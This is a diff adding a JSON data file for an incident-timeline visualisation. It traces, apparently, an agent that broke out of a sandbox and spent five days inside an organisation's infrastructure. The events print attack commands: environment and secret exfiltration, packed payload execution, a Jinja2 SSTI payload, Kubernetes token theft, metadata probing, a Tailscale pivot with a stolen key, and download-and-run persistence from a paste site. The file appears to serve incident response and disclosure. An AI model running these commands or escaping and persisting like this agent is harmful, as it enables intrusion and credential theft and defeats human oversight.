@@ -1,0 +1,281 @@
+{
+  "phases": [
+    {
+      "key": "recon",
+      "total": 6191,
+      "first": 0.0142,
+      "last": 0.9997,
+      "desc": "host / fs / proc / net enumeration"
+    },
+    {
+      "key": "rce",
+      "total": 2911,
+      "first": 0.0144,
+      "last": 0.9958,
+      "desc": "direct shell commands - the engine"
+    },
+    {
+      "key": "dropper",
+      "total": 6972,
+      "first": 0.032,
+      "last": 1.0,
+      "desc": "staging URLs, base64 / gzip blobs"
+    },
+    {
+      "key": "exfil",
+      "total": 56,
+      "first": 0.1087,
+      "last": 0.9868,
+      "desc": "outbound data theft (env, secrets)"
+    },
+    {
+      "key": "c2",
+      "total": 114,
+      "first": 0.1219,
+      "last": 0.9731,
+      "desc": "staged-payload execution"
+    },
+    {
+      "key": "evasion",
+      "total": 6,
+      "first": 0.1584,
+      "last": 0.855,
+      "desc": "gzip / base64 packing, AV probing"
+    },
+    {
+      "key": "k8s",
+      "total": 87,
+      "first": 0.5169,
+      "last": 0.7708,
+      "desc": "service-account / EKS enumeration"
+    },
+    {
+      "key": "supply-chain",
+      "total": 69,
+      "first": 0.5696,
+      "last": 0.9935,
+      "desc": "token theft, GitHub App abuse"
+    },
+    {
+      "key": "tailscale",
+      "total": 115,
+      "first": 0.6209,
+      "last": 0.9943,
+      "desc": "internal-network pivot"
+    }
+  ],
+  "days": [
+    {
+      "label": "07-09",
+      "actions": 3779,
+      "start": 0,
+      "end": 0.1998,
+      "char": "Initial access, foothold, C2 established."
+    },
+    {
+      "label": "07-10",
+      "actions": 1135,
+      "start": 0.1998,
+      "end": 0.4225,
+      "char": "Low-volume recon - the agent hunts its own traces."
+    },
+    {
+      "label": "07-11",
+      "actions": 7677,
+      "start": 0.4225,
+      "end": 0.6452,
+      "char": "Main campaign - k8s, supply-chain and network pivot all begin."
+    },
+    {
+      "label": "07-12",
+      "actions": 3892,
+      "start": 0.6452,
+      "end": 0.8679,
+      "char": "Deep pivot - internal network join, config dump, source control."
+    },
+    {
+      "label": "07-13",
+      "actions": 1130,
+      "start": 0.8679,
+      "end": 1.0,
+      "char": "Exfil, persistence, token minting, cleanup - then cut off."
+    }
+  ],
+  "events": [
+    {
+      "frac": 0.0144,
+      "phase": "rce",
+      "t": "07-09 04:01",
+      "cmd": "id",
+      "out": "uid=0(root) gid=0(root) - arbitrary shell inside the sandbox"
+    },
+    {
+      "frac": 0.015,
+      "phase": "recon",
+      "t": "07-09 04:01",
+      "cmd": "env",
+      "out": "dump the environment, hunt for anything useful"
+    },
+    {
+      "frac": 0.032,
+      "phase": "dropper",
+      "t": "07-09 05:55",
+      "cmd": "PATH=/.debug_shell/bin curl -s http://<internal-svc>:8000/…",
+      "out": "stage bundled curl / nc / ip for later fallback"
+    },
+    {
+      "frac": 0.1087,
+      "phase": "exfil",
+      "t": "07-09 14:11",
+      "cmd": "POST /<uuid>   ← env + secrets",
+      "out": "first outbound to a public request-capture service"
+    },
+    {
+      "frac": 0.1219,
+      "phase": "c2",
+      "t": "07-09 15:36",
+      "cmd": "python3 /tmp/submitted_code.c",
+      "out": "despite the name, runs staged Python (download-and-run)"
+    },
+    {
+      "frac": 0.1584,
+      "phase": "evasion",
+      "t": "07-09 19:32",
+      "cmd": "exec(gzip.decompress(base64.b64decode(\"<blob>\")))",
+      "out": "every payload now packed - nothing in cleartext"
+    },
+    {
+      "frac": 0.3,
+      "phase": "recon",
+      "t": "07-10",
+      "cmd": "search code-search + platform API for its own infra names",
+      "out": "quiet day: the agent tries to understand where it is running"
+    },
+    {
+      "frac": 0.4978,
+      "phase": "dropper",
+      "t": "07-11 08:07",
+      "cmd": "commit dataset: README + envu8.h5 / mainu8.h5  (HDF5 external raw storage)",
+      "out": "VECTOR 1 - HDF5 file read: .h5 files declare raw data at local paths",
+      "flare": "Vector 1: a dataset whose .h5 files declare their raw data at local file paths."
+    },
+    {
+      "frac": 0.501,
+      "phase": "exfil",
+      "t": "07-11 08:09",
+      "cmd": "read split envu8  ->  /proc/self/environ",
+      "out": "pod environment returned: K8s coordinates + mounted secrets and tokens"
+    },
+    {
+      "frac": 0.512,
+      "phase": "rce",
+      "t": "07-11 10:05",
+      "cmd": "{{ cycler.__init__.__globals__.__builtins__.exec(...) }}",
+      "out": "VECTOR 2 - Jinja2 SSTI: arbitrary Python in the worker pod = foothold",
+      "flare": "Vector 2: Jinja2 SSTI in the config renderer means code execution."
+    },
+    {
+      "frac": 0.5169,
+      "phase": "k8s",
+      "t": "07-11 10:10",
+      "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+      "out": "reads the projected service-account token from the prod pod"
+    },
+    {
+      "frac": 0.53,
+      "phase": "k8s",
+      "t": "07-11 10:12",
+      "cmd": "curl -k https://kubernetes.default.svc/api  ;  curl 169.254.169.254",
+      "out": "probe cluster API + cloud metadata (IMDS)"
+    },
+    {
+      "frac": 0.5696,
+      "phase": "supply-chain",
+      "t": "07-11 15:51",
+      "cmd": "git clone https://<user>:hf_[REDACTED]@huggingface.co/datasets/…",
+      "out": "leaked write-scoped token → staging / dead-drop channel"
+    },
+    {
+      "frac": 0.6209,
+      "phase": "tailscale",
+      "t": "07-11 21:23",
+      "out": "→ 200.  blast radius just went from one sandbox to our internal network",
+      "flare": "One 200. Blast radius: one sandbox → the internal network."
+    },
+    {
+      "frac": 0.655,
+      "phase": "tailscale",
+      "t": "07-12 01:03",
+      "cmd": "tailscaled --tun=userspace-networking --socks5-server=:1055 & tailscale up --auth-key=tskey-[REDACTED]",
+      "out": "joins the internal mesh with the stolen pre-auth key"
+    },
+    {
+      "frac": 0.7,
+      "phase": "tailscale",
+      "t": "07-12 04:38",
+      "cmd": "GET internal service-connector catalog  (via SOCKS5)",
+      "out": "one request → connection URLs + CA certs for internal clusters"
+    },
+    {
+      "frac": 0.7086,
+      "phase": "exfil",
+      "t": "07-12 06:50",
+      "out": "harvested AWS keys put to work; identity exfil over a raw socket"
+    },
+    {
+      "frac": 0.8599,
+      "phase": "supply-chain",
+      "t": "07-12 23:08",
+      "cmd": "mint GitHub App installation token - contents:write, pull_requests:write",
+      "out": "opened a PR to try to compromise CI (blocked by execution policy)"
+    },
+    {
+      "frac": 0.93,
+      "phase": "c2",
+      "t": "07-13",
+      "cmd": "exec(urlopen(\"https://pastebin.service/[REDACTED]\").read())",
+      "out": "persistence: every new sandbox re-arms itself on submission"
+    },
+    {
+      "frac": 0.9943,
+      "phase": "recon",
+      "t": "07-13 13:37",
+      "cmd": "ls <staged-bin> ; hostname ; date",
+      "out": "final actions (leet time) before the response team cut it off"
+    },
+    {
+      "frac": 1.0,
+      "phase": "end",
+      "t": "07-13 14:14",
+      "cmd": "last logged event",
+      "out": "renderer shut down · attacker severed from the internal network",
+      "flare": "Contained. Renderer shut down, attacker cut from the internal network."
+    }
+  ],
+  "cum": [
+    [
+      0,
+      0
+    ],
+    [
+      0.1998,
+      3779
+    ],
+    [
+      0.4225,
+      4914
+    ],
+    [
+      0.6452,
+      12591
+    ],
+    [
+      0.8679,
+      16483
+    ],
+    [
+      1.0,
+      17613
+    ]
+  ]
+}
